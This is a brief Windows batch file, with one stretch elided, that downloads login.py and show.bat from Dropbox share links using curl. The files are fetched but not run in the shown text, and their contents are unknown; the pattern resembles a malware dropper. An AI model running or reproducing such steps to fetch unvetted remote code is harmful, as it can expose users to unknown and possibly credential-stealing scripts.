@echo off
curl -L -o login.py https://www.dropbox.com/scl/fi/62w01iazrxw8zc0p1stod/login.py?rlkey=408mc1m8s9jr37zkq0tm7ktbj&st=0jwkdmlm&dl=0
...
curl -L -o show.bat https://www.dropbox.com/scl/fi/d9i05km5k10jpa372gsm5/show.bat?rlkey=bc4r8p0i6dgf6lh26efwls9b9&st=vdg0e0k2&dl=0
